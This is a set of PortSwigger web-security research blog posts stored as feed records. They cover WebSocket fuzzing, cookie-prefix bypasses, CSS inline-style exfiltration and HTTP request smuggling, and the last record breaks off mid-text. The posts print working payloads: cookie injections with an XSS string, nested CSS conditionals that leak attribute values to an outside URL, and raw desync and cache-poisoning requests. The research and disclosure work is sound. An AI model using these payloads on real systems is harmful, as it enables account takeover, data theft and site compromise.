{"source": "blog", "feed": "https://portswigger.net/research/rss", "title": "WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine", "url": "https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine", "published": "Wed, 17 Sep 2025 12:40:06 GMT", "content": "Published: 17 September 2025 at 12:40 UTC\nUpdated: 18 September 2025 at 07:50 UTC\nMany testers and tools give up the moment a protocol upgrade to WebSocket occurs, or only perform shallow analysis. This is a huge blind spot, leaving many bugs like Broken Access Controls, Race conditions, and SQL injection undetected. In this post, we look at the new version of WebSocket Turbo Intruder, a Burp Suite extension that brings Turbo Intruder’s fast attack engine to WebSocket testing. We will also talk about why auto-scanning WebSocket apps is hard, and how this tool helps fix those problems.\nWebSocket Turbo Intruder is a Burp Suite extension for fuzzing WebSocket messages with custom Python code. It extends the Burp Suite engine so it can exploit the WebSocket protocol specific vulnerabilities.\nWhile WebSocket Turbo Intruder includes a custom engine for speed, it’s not as battle-tested as Burp’s built-in engine. If you see errors or connection issues, try switching back to the default engine. Also, this tool is designed for high-volume testing against a single target - since WebSocket connections must stay open, testing large scopes is tricky and not well supported.\nYou can install WebSocket Turbo Intruder directly from the BApp Store, which is the easiest way to get started. Go to Extensions → BApp Store → WebSocket Turbo Intruder and click Install. If you prefer to build it yourself or want to explore the source code, the project is available on GitHub. Once installed, the extension will appear as a new menu item when you right click on any message in Burp Suite.\nThe extension comes with two built-in tools: Turbo Intruder and HTTP Middleware. The first one is best when you want to send thousands of WebSocket messages to a single target and look for interesting behavior. The second one is made for automating scanning, we’ll return to that later.\nLet’s start with a basic example python script. We will use it to test the PortSwigger Academy lab: Manipulating WebSocket messages to exploit vulnerabilities.\nThis script sends 10 different numeric values as part of the message JSON value when the Attack button is clicked. The resulting table, shown in the screenshot, will contain all requests (outgoing messages) and responses (incoming messages) handled by the extension.\nUnlike HTTP, the WebSocket protocol can send multiple incoming messages for one outgoing message. This makes testing much harder, because the table quickly fills with noise. In our case, a single \"request\" triggers three different \"responses\". To handle this, the extension includes powerful filters. These let you hide irrelevant traffic and lock requests to only the responses you care about. Here’s an example decorator that keeps only messages from the user Hal Pline and filters out everything else:\ndef queue_websockets(upgrade_request, message):\nconnection = websocket_connection.create(upgrade_request)\nfor i in range(10):\nconnection.queue(message, str(i))\ndef handle_outgoing_message(websocket_message):\nresults_table.add(websocket_message)\n@MatchRegex(r'{\"user\":\"Hal Pline\"')\ndef handle_incoming_message(websocket_message):\nresults_table.add(websocket_message)\nIf manual review of the result table is not your style, you can wrap a WebSocket connection inside an HTTP request using WebSocket Turbo Intruder HTTP Middleware. Select any WebSocket message from Proxy History, then right-click and choose Extensions → WebSocket Turbo Intruder → Send to WebSocket HTTP Middleware. This lets you use filters to capture only the traffic you care about while interacting with the server through a local HTTP endpoint.\nFor example, here we use the included ServerExample.py script to create a WebSocket connection and filter the incoming messages to only show the ones echoed back from the PortSwigger Academy lab:\ndef create_connection(upgrade_request):\nconnection = websocket_connection.create(upgrade_request)\nreturn connection\ndef handle_outgoing_message(websocket_message):\nresults_table.add(websocket_message)\n@MatchRegex(r'{\"user\":\"You\"')\ndef handle_incoming_message(websocket_message):\nresults_table.add(websocket_message)\nFrom now on, we can send an HTTP POST request to localhost, with the request body treated as a WebSocket message. This allows you to scan any WebSocket using an automated scanner like Burp Suite Pro.\nPOST /proxy?url=https%3A%2F%2F0a7c00a903d17c5a801d35d8008a007a.web-security-academy.net%2Fchat HTTP/1.1\nHost: 127.0.0.1:9000\nContent-Length: 16\n{\"message\":\"hi\"}\nYou can customize this code to match the logic of your target application. This setup is ideal for finding server-side vulnerabilities like SQL injection, authentication bypass, or command injection.\nIn addition to the usual application bugs, WebSockets bring their own unique attack surface. We will look at some of these next.\nSocket.IO is a popular JavaScript framework that comes with its own WebSocket implementation. This makes testing more complicated - but with WebSocket Turbo Intruder you can work around these limitations.\nThe easiest way to confirm that a server uses Socket.IO is by checking the mandatory query parameter EIO, which specifies the protocol version. If it equals 4, the server sends ping packets. We can automate this process with the built-in Ping and Pong decorators. After that, the script sends the initial message \"40\" to start the conversation, and the rest of the logic works as usual.\nimport burp.api.montoya.http.message.params.HttpParameter as HttpParameter;\ndef queue_websockets(upgrade_request, message):\nconnection = websocket_connection.create(\nupgrade_request.withUpdatedParameters(HttpParameter.urlParameter(\"EIO\", \"4\")))\nconnection.queue('40')\nconnection.queue('42[\"message\",\"hello\"]')\n@Pong(\"3\")\ndef handle_outgoing_message(websocket_message):\nresults_table.add(websocket_message)\n@PingPong(\"2\", \"3\")\ndef handle_incoming_message(websocket_message):\nresults_table.add(websocket_message)\nHTTP adapter script for the Socket.IO protocol:\nimport burp.api.montoya.http.message.params.HttpParameter as HttpParameter;\ndef create_connection(upgrade_request):\nconnection = websocket_connection.create(\nupgrade_request.withUpdatedParameters(HttpParameter.urlParameter(\"EIO\", \"4\")))\nconnection.queue('40')\nconnection.decIn()\nreturn connection\n@Pong(\"3\")\ndef handle_outgoing_message(websocket_message):\nresults_table.add(websocket_message)\n@PingPong(\"2\", \"3\")\ndef handle_incoming_message(websocket_message):\nresults_table.add(websocket_message)\nInterestingly, some protocol quirks in Socket.IO make it a good candidate for server-side prototype pollution. As shown in Gareth’s earlier research Server-side prototype pollution: Black-box detection without the DoS, it’s possible to abuse Express server features to detect successful pollution. Using the same technique here, we can trick Socket.IO into returning a new greeting message by polluting the initialPacket property with: {\"__proto__\":{\"initialPacket\":\"Polluted\"}}\nExploit in action:\nThe default Intruder script sends messages in chunks over a single connection. This is great for performance, but not useful when testing for race condition vulnerabilities, where timing and concurrency matter.\nTo help with that, WebSocket Turbo Intruder includes a special engine type called THREADED. This engine starts multiple worker threads, each with its own WebSocket connection, and sends messages in parallel. This makes it possible to trigger classic race conditions like logic bypasses, token reuse, or state desync bugs.\nDon’t worry if you’re not familiar with Python threading - the included RaceConditionExample.py script needs only small changes to fit your target. The most important settings are defined in the config() method: the number of threads to control how many simultaneous connections are opened.\nThis threaded model gives you better control over concurrency and lets you experiment with timing-sensitive issues that are invisible to single-connection fuzzing.\nWhile testing for race conditions, I came across an unexpected denial-of-service vulnerability in a Java WebSocket implementation.\nAccording to the RFC, a WebSocket frame begins with a header specifying the opcode and payload length. But what happens if the length doesn’t match the actual payload - or the payload is never sent at all?\nUsing the TURBO engine, we can send any kind of WebSocket frame, including malformed ones. This allows us to manually adjust the payload length in the header without needing to send gigabytes of data. Java WebSocket implementation has the following issue. It reads the message header and allocates a huge buffer on the server using user specified value at header payload length field, leading to an Out Of Memory crash if that value is Integer Max Value. After that the server is no longer responding to any connection attempts. You can find the full source code in PingOfDeathExample.py included with the extension.\nWebSocket Turbo Intruder also includes a standalone CLI, perfect for automation, scripting, or running attacks outside Burp Suite. Here’s a basic usage example:\njava -jar WebSocketFuzzer-2.0.0.jar <scriptFile> <requestFile> <endpoint> <baseInput>\nCommand-line support is pretty basic. But it’s great for running long attacks on a single target, especially in background jobs.\nWebSocket Turbo Intruder includes a built-in WS Logger feature that records up to 1,000 WebSocket messages. This is especially useful when debugging scripts that use HTTP Middleware, where matching outgoing and incoming messages correctly is key.\nWith the logger enabled on WebSocket Turbo Intruder → Logger On, you can track both message contents and their internal IDs. These IDs are used to pair requests and responses - so if something breaks or a message gets mismatched, you can inspect the logs to figure out what went wrong.\nIf needed, you can also fine-tune how message IDs are handled by using dec* and inc* methods from the Connection interface. This gives you full control over how messages are assigned and grouped.\nWhilst working on the WebSocket Turbo Intruder, I drew inspiration from some excellent work, including @albinowax - Turbo Intruder: Embracing the billion-request attack, @garethheyes - Server-side prototype pollution: Black-box detection without the DoS and @vah_13 - Race Conditions in Websockets.\nA quick word of caution - WebSocket Turbo Intruder is powerful. It can send thousands of messages per second and open many connections in parallel. If you’re not careful, you might overload the server or trigger denial-of-service conditions. Always use it on targets where automated scanning is allowed, and try not to take down the internet while you’re at it.\nWebSocket Turbo Intruder also supports features like automatic Ping/Pong messages and built-in filtering using the isInteresting() method. You can learn more about these and other advanced options in the Github repository. If you find a bug or have a feature request, feel free to open a new issue.\nThe recording of the presentation will be available shortly on the Black Hat Arsenal channel.\nGood luck, have fun.", "timestamp": "2025-10-21T13:32:59.700935"}
{"source": "blog", "feed": "https://portswigger.net/research/rss", "title": "Cookie Chaos: How to bypass __Host and __Secure cookie prefixes", "url": "https://portswigger.net/research/cookie-chaos-how-to-bypass-host-and-secure-cookie-prefixes", "published": "Wed, 03 Sep 2025 14:46:23 GMT", "content": "Published: 03 September 2025 at 14:46 UTC\nUpdated: 03 September 2025 at 14:46 UTC\nBrowsers added cookie prefixes to protect your sessions and stop attackers from setting harmful cookies. In this post, you’ll see how to bypass cookie defenses using discrepancies in browser and server logic.\nFor a visual walk‑through, see the SteelCon livestream recording:\nCookie prefixes were introduced in RFC 6265bis to strengthen cookie security through naming rules:\nThese restrictions are enforced by browsers to prevent attacks like cookie tossing or session fixation. However, inconsistencies in how browsers and servers handle cookie encoding and parsing can introduce subtle but dangerous flaws.\nAccording to the original RFC 6265, the Cookie header is defined as a sequence of octets, not characters. This means the browser sends raw bytes on the wire, and it’s the server’s responsibility to decode those bytes into a string. If the browser and server interpret those bytes differently, parsing discrepancies can occur.\nBy using UTF-8 encoding, an attacker can disguise a restricted cookie - such as one that starts with __Host- in a way that bypasses browser protections. The browser may treat it as a non-restricted cookie, but the server might decode and normalize it in a way that causes it to be interpreted as a protected one.\nHere’s a minimal proof of concept that demonstrates this behavior:\ndocument.cookie=\n`${String.fromCodePoint(0x2000)}__Host-name=injected; Domain=.example.com; Path=/;`\nThis whitespace-prefixed cookie is interpreted by the browser as a non-prefixed, non-restricted value and is therefore sent to all subdomains within the target domain’s scope.\nDuring testing, I discovered that certain server-side frameworks, such as Django and ASP.NET, apply normalization and trimming to cookie names before processing. Specifically, when the server interprets U+2000 as a whitespace character, it removes it, resulting in a cookie name that becomes equivalent to __Host-name.\nDjango uses Python’s built-in .strip() method to process cookie keys and values. This method removes a wide range of Unicode whitespace characters, including [133, 160, 5760, 8192–8202, 8232, 8233, 8239, 8287, 12288], effectively treating them as a space.\nInterestingly, Safari handles this case differently. It does not support multibyte Unicode whitespace characters in cookie names, which prevents values like U+2000 from being used. However, single-byte characters such as U+0085 (NEL) and U+00A0 (non-breaking space) are still permitted.\nIn addition to Unicode tricks, legacy cookie parsing behavior can also be abused to bypass prefix protections. As shown in the previous blog post, if a Cookie header begins with $Version=1, some Java-based web servers, such as Apache Tomcat and Jetty, switch into a legacy parsing. In this mode, a single cookie string may be interpreted as multiple separate cookies. For example, the following JavaScript sets a cookie that includes a forged __Host- pair:\ndocument.cookie=\n`$Version=1,__Host-name=injected; Path=/somethingreallylong/; Domain=.example.com;`;\nThis lets the attacker bypass the browser’s prefix checks and inject high-privilege cookies from a subdomain or over an insecure origin.\nSuppose you discover an XSS vulnerability where a cookie value is reflected into a web page without proper escaping. The application uses a __Host- prefixed cookie, which normally prevents overwriting from untrusted subdomains due to browser-enforced restrictions. However, using one of the techniques described earlier, you inject a forged __Host-name cookie using JavaScript:\ndocument.cookie=\n`${String.fromCodePoint(0x2000)}__Host-name=<img src=x onerror=alert(1)>;\nDomain=example.com;\nPath=/;`\nThe browser, unaware that this cookie is equivalent to the protected one, accepts it and includes both the original and attacker-controlled cookies in the request. On the wire, the browser sends the following header:\nCookie: __Host-name=Carlos; â€€__Host-name=<img src=x onerror=alert(1)>;\nWhen this request reaches the backend, the server parses the Cookie header. If multiple cookies with the same name are present, many frameworks, including Django, resolve the conflict by accepting only one value, typically the last occurrence. In this case, the attacker-controlled value takes precedence.\nIf the application reflects this cookie value into the response without proper encoding, the result is a cross-site scripting vulnerability. Alternatively, if the same cookie is used for CSRF protection or session identification, this behavior can also lead to session fixation or other privilege escalation paths.\nDjango responded to my vulnerability report:\nThe official Django documentation has a warning against permitting cookies from untrusted subdomains as this is vulnerable to attacks: https://docs.djangoproject.com/en/5.0/topics/http/sessions/#topics-session-security. As this attack relies on this, this will not be treated as a security vulnerability.\nThe same cookie can be interpreted in different ways by the browser and the backend. This mismatch can quietly break the guarantees of cookie confidentiality and integrity, even when the strongest browser-side protections. To help test for the issues discussed here I’ve created a lightweight Custom Action for Burp Suite.\nIt can quickly detect conditions where a backend may be vulnerable to cookie prefix bypasses.\nThis blog post concludes our exploration into cookie parsing inconsistencies and how they can be exploited to bypass security mechanisms. If you haven’t already, make sure to check out the previous article in this series, where we demonstrated how the cookie sandwich technique can be used to steal HttpOnly cookies.", "timestamp": "2025-10-21T13:33:00.669286"}
{"source": "blog", "feed": "https://portswigger.net/research/rss", "title": "Inline Style Exfiltration: leaking data with chained CSS conditionals", "url": "https://portswigger.net/research/inline-style-exfiltration", "published": "Tue, 26 Aug 2025 12:54:03 GMT", "content": "Published: 26 August 2025 at 12:54 UTC\nUpdated: 27 August 2025 at 07:35 UTC\nI discovered how to use CSS to steal attribute data without selectors and stylesheet imports! This means you can now exploit CSS injection via style attributes! Learn how below:\nSomeone asked if you could steal data using inline styles. I initially dismissed the idea but then I was reminded of Slonser's excellent technique of using the attr() and image-set() functions to steal data from the attribute. This method can steal an entire attribute provided you import a style sheet from your chosen domain. But this left me pondering what about without importing a stylesheet? Can you steal data just using inline styles?\nCSS introduced if statements, that's right this (not a) programming language now has conditionals. I was sure I could use this as a way to check the attribute value and make a background request to any domain I like without requiring a stylesheet import. I began crafting a vector:\n<div style=\"--val:attr(title);--steal:if(style(--val:'1'): url(/1);\nelse: url(/2));background:image-set(var(--steal))\" title=1>test</div>\nBut it didn't work. Then Slonser sent a snippet that did work and it turned out the if statement comparison requires double not single quotes:\n<div style='--val:attr(title);--steal:if(style(--val:\"1\"): url(/1); else: url(/2));background:image-set(var(--steal))' title=1>test</div>\nHow quirky is CSS! I'm used to single and double quotes being interchangeable like JavaScript. So now we could make a request to an arbitrary domain using a background request and inline styles. The problem here is that you can only check one value but of course this (not a) programming language supports nested if statements! So you can chain them together and check for multiple values. This allows you to steal non-complex data such as user ids or usernames:\n<div style='--val: attr(data-uid); --steal: if(style(--val:\"1\"): url(/1); else: if(style(--val:\"2\"): url(/2); else: if(style(--val:\"3\"): url(/3); else: if(style(--val:\"4\"): url(/4); else: if(style(--val:\"5\"): url(/5); else: if(style(--val:\"6\"): url(/6); else: if(style(--val:\"7\"): url(/7); else: if(style(--val:\"8\"): url(/8); else: if(style(--val:\"9\"): url(/9); else: url(/10)))))))))); background: image-set(var(--steal));' data-uid='1'></div>\nIn the preceding example it can steal the data-uid attribute if it contains a value in the range of 1-10. So if you ever find yourself locked in a style attribute and need to steal the data of an attribute you can use our Custom Action in Burp Suite to brute force the required values! Note at the time of writing this technique only works on Chromium based browsers.\nHere's a video demonstrating stealing usernames from the data-username attribute using a Burp Custom Action:\nHere is the code used in the video:\n<div style='--val: attr(data-username); --steal: if(style(--val:\"martin\"): url(https://portswigger.net/martin); else: if(style(--val:\"zak\"): url(https://portswigger.net/zak); else: url(https://portswigger.net/james))); background: image-set(var(--steal));' data-username=\"james\"></div>\nLuke Jahnke pointed out you can make a background request without the url() syntax. A plain string will do. This means the vector can be reduced to:\n<div style='--val:attr(title);--steal:if(style(--val:\"1\"): \"/1\"; else: \"/2\");background:image-set(var(--steal))' title=1>test</div>", "timestamp": "2025-10-21T13:33:01.549290"}
{"source": "blog", "feed": "https://portswigger.net/research/rss", "title": "Beware the false false-positive: how to distinguish HTTP pipelining from request smuggling", "url": "https://portswigger.net/research/how-to-distinguish-http-pipelining-from-request-smuggling", "published": "Tue, 19 Aug 2025 14:30:44 GMT", "content": "Published: 19 August 2025 at 14:30 UTC\nUpdated: 19 August 2025 at 14:31 UTC\nSometimes people think they've found HTTP request smuggling, when they're actually just observing HTTP keep-alive or pipelining. This is usually a false positive, but sometimes there's actually a real vulnerability there! In this post I'll explore how to tell the two apart.\nThis post was triggered by the publication of http1mustdie.com which resulted in me getting a bunch of messages from people confused and intrigued by connection reuse. The answer is too nuanced to put into a quick reply so I'm writing it up here instead.\nIf you see a request smuggling proof of concept that only works when you reuse connections, it's probably a false positive. Here are some common examples of connection reuse:\nHowever, it's not always a false positive. There are three valid closely related vulnerability classes where connection reuse is required:\nSo, when creating a request smuggling proof of concept, always disable connection reuse where possible. If this breaks your attack, you have a choice - give up, or dive deeper.\nTo help you distinguish between these two scenarios, I have published a Custom Action called Smuggling or pipelining? - you can install it into Burp Repeater using copy+paste, or import via the Extensibility Helper extension in the BApp store.\nMost tools represent HTTP/1 requests as individual, isolated entities. This is usually a convenient abstraction, but request smuggling attempts to break it, so it's crucial to understand the layer below.\nTo help, we just launched HTTP Hacker - a new Burp Suite extension which exposes low-level HTTP behaviour. To get the most out of these examples, install HTTP Hacker from Extensions->BApp Store and use it to follow along.\nUnder the hood, HTTP/1.1 reuses connections by concatenating requests and responses on the underlying TCP/TLS socket. This is known as HTTP connection reuse, pipelining, or keep-alive. Here's an example:\nPOST / HTTP/1.1\nHost: hackxor.net\nConnection: keep-alive\nContent-Length: 5\n12345GET /robots.txt HTTP/1.1\nHost: hackxor.net\nPipelining is a sub-type of connection reuse where the client sends all their requests in one go and relies on the responses coming back in the correct order. Most servers support pipelined requests, but few real clients send them - it's what makes Turbo Intruder so fast.\nNow we understand the fundamentals, let's consider what happens when we sent this CL.0 attack twice, and reuse the connection:\nPOST / HTTP/1.1\nHost: hackxor.net\nContent_Length: 47\nGET /robots.txt HTTP/1.1\nX: Y\nResponse one:\nHTTP/1.1 200 OK\nContent-Type: text/html\nResponse two:\nHTTP/1.1 200 OK\nContent-Type: text/plain\nUser-agent: *\nDisallow: /settings\nWe can see that at least one server has ignored the malformed Content_Length header. You might think you've created a desync between the front-end and back-end webserver:\nHowever, all you've actually done is cause a desync between your HTTP client, and the target server:\nHere's the underlying request stream:\nPOST / HTTP/1.1\nHost: hackxor.net\nContent_Length: 47\nGET /robots.txt HTTP/1.1\nX: YPOST / HTTP/1.1\nHost: hackxor.net\nContent_Length: 47\nGET /robots.txt HTTP/1.1\nX: Y\nThis is useless. In fact, hackxor doesn't even have a back-end so it's immune to request smuggling.\nHopefully that helps clarify why reusing client connections can cause false positives - please let me know if you have any lingering questions.\nIt would be nice if I could simply say \"never reuse connections when testing for request smuggling\", but life is never that simple.\nSome front-end servers only reuse the upstream connection if the client connection was reused. This means you can end up with request smuggling vulnerabilities that can only be triggered via client-side connection reuse. I call this scenario connection-locked request smuggling.\nTo confirm this, see if you can send a request over HTTP/2 that triggers a response containing a separate HTTP/1 response nested inside it. This proves it's not a false positive, and means it's worth investing time in trying to build an exploit. Alternatively, you can often distinguish connection-locked request smuggling using partial requests.\nHowever, to prove a vulnerability is really present, you need to obtain evidence of real impact beyond \"an attacker can make themselves receive a surprising response\". Connection-locked request smuggling can't be used for direct cross-user attacks, but you can still:\nThis is your pathway to a valid report! If you think you've found a connection-locked request smuggling, I would suggest the following steps. You can explore these in Turbo Intruder with requestsPerConnection=2, or using a Repeater tab group via 'Send group in sequence (single connection)'.\nFirst, identify whether there is a cache layer and if so, poison it - this is an easy high-impact attack.\nIf there's no cache, look for an input reflection gadget and use it to reveal any headers the front-end is injecting. Sometimes internal headers enable complete authentication bypass!\nIf there are any visible front-end security measures, such as requests to certain paths being blocked, see if you can use the request smuggling to bypass them.\nFinally, explore how the application responds to host-header tampering, both directly and in smuggled requests. You may be able to use connection-locked request smuggling to gain access to some previously off-limits internal systems, or launch other host-header attacks.\nWhen exploring connection-locked request smuggling, you might also uncover connection-state attacks such as first-request routing.\nThese occur because some servers treat the first request on each connection differently from subsequent requests on the same connection. They are not technically request smuggling vulnerabilities, and can even occur on targets with no front-end server, but ultimately the impact is very similar to connection-locked request smuggling.\nHTTP Request Smuggler supports a 'connection-state probe' which will attempt to automatically identify these.\nThere is one other scenario where connection reuse is exploitable, and that is client-side desync attacks. Note that this comes with a major restriction - the attack request must be something you can get the victims' web browser to send, cross-domain! In practice, this means you can't use any header obfuscation techniques. For further information, refer to Browser-Powered Desync Attacks, and our client-side desync Academy topic.\nI hope you found that useful! Request smuggling is a topic with immense depth and this is just a taster. If you'd like to master it, check out all our desync research, and our full Academy topic with 20+ interactive labs.", "timestamp": "2025-10-21T13:33:02.580979"}
{"source": "blog", "feed": "https://portswigger.net/research/rss", "title": "HTTP/1.1 must die: the desync endgame", "url": "https://portswigger.net/research/http1-must-die", "published": "Wed, 06 Aug 2025 22:20:00 GMT", "content": "Published: 06 August 2025 at 22:20 UTC\nUpdated: 17 October 2025 at 10:13 UTC\nUpstream HTTP/1.1 is inherently insecure and regularly exposes millions of websites to hostile takeover. Six years of attempted mitigations have hidden the issue, but failed to fix it.\nThis paper introduces several novel classes of HTTP desync attack capable of mass compromise of user credentials. These techniques are demonstrated through detailed case studies, including critical vulnerabilities which exposed tens of millions of websites by subverting core infrastructure within Akamai, Cloudflare, and Netlify.\nI also introduce an open-source toolkit that enables systematic detection of parser discrepancies and target-specific weak spots. Combined, this toolkit and these techniques yielded over $200,000 in bug bounties in a two-week period.\nUltimately, I argue that HTTP request smuggling must be recognized as a fundamental protocol flaw. The past six years have demonstrated that addressing individual implementation issues will never eliminate this threat. Although my findings have been reported and patched, websites remain silently vulnerable to inevitable future variants. These all stem from a fatal flaw in HTTP/1.1 which means that minor implementation bugs frequently trigger severe security consequences. HTTP/2+ solves this threat. If we want a secure web, HTTP/1.1 must die.\nPlease note you can find a summary and FAQ aimed at a broader audience at http1mustdie.com. You can also get the talk slides, and this whitepaper formatted as a printable PDF. Here's the presentation recording from DEFCON:\nHTTP/1.1 has a fatal, highly-exploitable flaw - the boundaries between individual HTTP requests are very weak. Requests are simply concatenated on the underlying TCP/TLS socket with no delimiters, and there are multiple ways to specify their length. This means attackers can create extreme ambiguity about where one request ends and the next request starts. Major websites often use reverse proxies, which funnel requests from different users down a shared connection pool to the back-end server. This means that an attacker who finds the tiniest parser discrepancy in the server chain can cause a desync, apply a malicious prefix to other users' requests, and usually achieve complete site takeover:\nAs HTTP/1.1 is an ancient, lenient, text-based protocol with thousands of implementations, finding parser discrepancies is not hard. When I first discovered this threat in 2019, it felt like you could hack anything. For example, I showed it could be exploited to compromise PayPal's login page, twice. Since then, we have also published a free online course on request smuggling and multiple further research papers. If you get lost in any technical details later on, it may be useful to refer back to these.\nSix years later, it's easy to think we've solved the problem, with a combination of parser tightening and HTTP/2 - a binary protocol that pretty much eliminates the entire attack class if it's used for the upstream connections from the front-end onwards. Unfortunately, it turns out all we've managed to do is make the problem look solved.\nIn 2025, HTTP/1.1 is everywhere - but not necessarily in plain sight. Servers and CDNs often claim to support HTTP/2, but actually downgrade incoming HTTP/2 requests to HTTP/1.1 for transmission to the back-end system, thereby losing most of the security benefits. Downgrading incoming HTTP/2 messages is even more dangerous than using HTTP/1.1 end to end, as it introduces a fourth way to specify the length of a message. In this paper, we'll use the following acronyms for the four major length interpretations:\nCL (Content-Length)\nTE (Transfer-Encoding)\n0 (Implicit-zero)\nH2 (HTTP/2's built-in length)\nHTTP/1.1 may look secure at first glance because if you apply the original request smuggling methodology and toolkit, you'll have a hard time causing a desync. But why is that? Let's take a look at a classic CL.TE attack using a lightly obfuscated Transfer-Encoding header. In this attack, we are hoping that the front-end server parses the request using the Content-Length header, then forwards the request to a back-end which, calculates the length using the Transfer-Encoding header.\nPOST / HTTP/1.1\nHost: <redacted>\nTransfer-Encoding : chunked\nContent-length: 35\n0\nGET /robots.txt HTTP/1.1\nX: y\nHTTP/1.1 200 OK\nHere's the simulated victim:\nGET / HTTP/1.1\nHost: example.com\nHTTP/1.1 200 OK\nDisallow: /\nThis used to work on a vast number of websites. These days, the probe will probably fail even if your target is actually vulnerable, for one of three reasons:\nThe alternative, timeout-based detection strategy discussed in my previous research is also heavily fingerprinted and blocked by WAFs.\nThis has created the desync endgame - you've got the illusion of security thanks to toy mitigations and selective hardening that only serves to break the established detection methodology. Everything looks secure until you make the tiniest change.\nIn truth, HTTP/1.1 implementations are so densely packed with critical vulnerabilities, you can literally find them by mistake.\nHTTP/1.1 is simply not fit for a world where we solve every problem by adding another layer. The following case-study illustrates this beautifully.\nWannes Verwimp asked for my thoughts on an issue he'd discovered affecting a site hosted on Heroku, behind Cloudflare. He'd found an H2.0 desync and was able to exploit it to redirect visitors to his own website.\nGET /assets/icon.png HTTP/2\nHost: <redacted>\nGET /assets HTTP/1.1\nHost: psres.net\nX: y\nHTTP/2 200 OK\nCf-Cache-Status: HIT\nGET / HTTP/2\nHost: <redacted>\nHTTP/2 302 Found\nLocation: https://psres.net/assets/\nThis redirect was getting saved in Cloudflare's cache, so by poisoning the cache entry for a JavaScript file, he was able to take persistent control of the entire website. This was all unremarkable except for one thing - the users being hijacked weren't trying to access the target website. The attack was actually compromising random third party sites, including certain banks!\nI agreed to investigate and noticed something else strange - the attack was blocked by Cloudflare's front-end cache, meaning the request would never reach the back-end server. I reasoned that there was no way this attack could possibly work and Wannes must have made a mistake, so I added a cache-buster... and the attack failed. When I removed the cache-buster, it started working.\nBy ignoring the fact his attack was being blocked by a cache, Wannes had discovered a HTTP/1.1 desync internal to Cloudflare's infrastructure:\nThis finding exposed over 24,000,000 websites to complete site takeover! It embodies the desync endgame - the classic methodology doesn't work, but the systems built on HTTP/1 are so complex and critical that you can make one mistake and end up with control over 24 million websites.\nWe reported this issue, and Cloudflare patched it within hours, published a post-mortem and awarded a $7,000 bounty.\nReaders unfamiliar with bug bounty hunting may find themselves surprised by the bounties paid relative to the impact throughout this whitepaper, but most bounties received were close to the maximum payout advertised by the respective program. Bounty size is an artefact of the underlying economics and any genuinely surprising bounty experiences will be highlighted.\nHow does a bug like that happen? Partly, it's the sheer complexity of the systems involved. For example, we can infer that requests sent to Cloudflare over HTTP/2 are sometimes rewritten to HTTP/1.1 for internal use, then rewritten again to HTTP/2 for the upstream connection! However, the underlying problem is the foundation.\nThere's a widespread, dangerous misconception that HTTP/1.1 is a robust foundation suitable for any system you might build. In particular, people who haven't implemented a reverse-proxy often argue that HTTP/1.1 is simple, and therefore secure. The moment you attempt to proxy HTTP/1.1, it becomes a lot less simple. To illustrate this, here are five lies that I personally used to believe - each of which will be critical to a real-world exploit discussed later in this paper\nWhich ones did you believe? Can you map each statement to the feature that undermines it?\nTaken together, the reality behind the last three lies is that your proxy needs a reference to the request object just to read the correct number of response bytes off the TCP socket from the back-end, and you need control-flow branches to handle multiple header blocks even before you even reach the response body, and the entire response may arrive before the client has even finished sending you the request.\nThis is HTTP/1.1 - it's the foundation of the web, full of complexities and gotchas that routinely expose millions of websites, and we've spent six years failing to patch implementations to compensate for it. It needs to die. To achieve that, we need to collectively show the world that HTTP/1.1 is insecure - in particular, that more desync attacks are always coming.\nIn the rest of this paper, I hope to show you how to do that.\nAll case-studies were identified through authorized testing on targets with vulnerability disclosure programs (VDPs), and have been privately reported and patched (unless mentioned otherwise). As a side effect of VDP terms and conditions, many of them are partially redacted, even though the issues are actually patched. Where a company is explicitly named, this is an indication that they have a more mature security program.\nAll bounties earned during this research were split equally between everyone involved, and my cut was doubled by PortSwigger then donated to a local charity.\nIn the desync endgame, detecting vulnerabilities is difficult due to mitigations, complexity, and quirks. To thrive in this environment, we need a detection strategy that reliably identifies the underlying flaws that make desync attacks possible, rather than attempting brittle attacks with many moving parts. This will set us up to recognize and overcome exploitation challenges.\nBack in 2021, Daniel Thacher presented Practical HTTP Header Smuggling at Black Hat Europe, and described an approach for detecting parser discrepancies using the Content-Length header. I liked the concept so much that after I tried his tool out, I decided to try building my own implementation from scratch, do things slightly differently, and see what happened.\nThis tool proved highly effective, and I'm pleased to release it in the open-source Burp Suite extension HTTP Request Smuggler v3.0. Here's a high-level overview of the three key elements used for analysis, and the possible outcomes:\nLet's take a look at real detection, and how to interpret it:\nGET / HTTP.1.1\nHost: <redacted-food-corp>\nHTTP/1.1 200 OK\nXost: <redacted-food-corp>\nHTTP/1.1 503 Service Unavailable\nHost: <redacted-food-corp>\nHTTP/1.1 400 Bad Request\nXost: <redacted-food-corp>\nHTTP/1.1 503 Service Unavailable\nHere, HTTP Request Smuggler has detected that sending a request with a partially-hidden Host header causes a unique response that can't be triggered by sending a normal Host header, or by omitting the header entirely, or by sending an arbitrary masked header. This is strong evidence that there's a parser discrepancy in the server chain used by the target. If we assume there's a front-end and a back-end, there's two key possibilities:\nVisible-Hidden (V-H): The masked Host header is visible to the front-end, but hidden from the back-end\nHidden-Visible (H-V): The masked Host header is hidden from the front-end, but visible to the back-end\nYou can often distinguish between V-H and H-V discrepancies by paying close attention to the responses, and guessing whether they originated from a front-end or back-end. Note that the specific status codes are not relevant, and can sometimes be confusing. All that matters is that they're different. This finding turned out to be a V-H discrepancy.\nGiven a V-H discrepancy, you could attempt a TE.CL exploit by hiding the Transfer-Encoding header from the back-end, or try a CL.0 exploit by hiding the Content-Length header. I highly recommend using CL.0 wherever possible as it's much less likely to get blocked by a WAF. On many V-H targets, including the one above, exploitation was simple:\nGET /style.css HTTP/1.1\nHost: <redacted-food-corp>\nFoo: bar\nContent-Length: 23\nGET /404 HTTP/1.1\nX: y\nHTTP/1.1 200 OK\nGET / HTTP/1.1\nHost: <redacted-food-corp>\nHTTP/1.1 404 Not Found\nOn a different target, the above exploit failed because the front-end server was rejecting GET requests that contained a body. I was able to work around this simply by switching the method to OPTIONS. It's the ability to spot and work around barriers like this that makes scanning for parser-discrepancies so useful.\nI didn't invest any time in crafting a fully weaponized PoC on this target, as it's not economical for low-paid bounty programs and VDPs.\nBy combining different headers, permutations, and strategies, the tool achieves superior coverage. For example, here's a discovery made using the same header (Host), and the same permutation (leading space before header name), but a different strategy (duplicate Host with invalid value):\nPOST /js/jquery.min.js\nHost: <vpn.redacted>\nHost: x/x\nHTTP/1.1 400 Bad Request\nXost: x/x\nHTTP/1.1 412 Precondition Failed\nHost: 